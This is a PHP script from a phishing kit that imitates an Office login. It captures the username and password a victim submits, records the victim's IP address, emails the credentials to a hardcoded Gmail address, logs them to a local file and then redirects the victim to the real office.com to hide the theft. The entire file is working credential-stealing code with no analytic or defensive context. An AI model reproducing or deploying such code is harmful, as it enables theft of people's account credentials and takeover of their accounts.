<?php
$ZoRo = getenv("REMOTE_ADDR");
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "OFFICE LOGIN   [ " . $ZoRo . " ] /";
$headers = "From: MR CODER_X <OFFICE>\r\n";
$message .= "
+----/!\----<.![+] OFFICE LOGIN  [+]!.>---/!\----+
 [IP]                 : ".$ip."
 [Username]      : ".$_POST['ml']."
 [PASSWORD]           : ".$_POST['pw']."
-------------------------------------------------\n";
mail("alexusman603@gmail.com",$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
header("Location: https://www.office.com/");

?>